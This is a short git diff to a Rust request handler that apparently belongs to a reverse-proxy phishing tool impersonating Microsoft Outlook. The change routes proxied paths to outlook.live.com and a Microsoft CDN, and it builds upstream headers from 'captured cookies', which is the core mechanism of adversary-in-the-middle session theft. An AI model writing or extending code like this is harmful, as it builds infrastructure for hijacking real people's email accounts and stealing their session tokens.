@@ -154,18 +154,21 @@ pub async fn proxy_handler(
         None
     };
     
-    // Map proxy paths to real Microsoft paths
-    let microsoft_path = if path.starts_with("/s/") {
+    // Map proxy paths to real Microsoft domains and paths
+    let (microsoft_domain, microsoft_path) = if path.starts_with("/s/") {
         // Session paths map to Outlook mail
-        "/mail/"
+        ("outlook.live.com", "/mail/")
+    } else if path.starts_with("/owamail/") || path.starts_with("/assets/") {
+        // CDN resources
+        ("res.public.onecdn.static.microsoft", path)
     } else if path == "/" || path == "/owa/" {
-        "/owa/"
+        ("outlook.live.com", "/owa/")
     } else {
-        path
+        ("outlook.live.com", path)
     };
     
     // Build target URL
-    let target_url = format!("https://{}{}", config.target_domain, microsoft_path);
+    let target_url = format!("https://{}{}", microsoft_domain, microsoft_path);
     
     // Build proxy headers with captured cookies
     let mut headers = build_proxy_headers(&req, config);
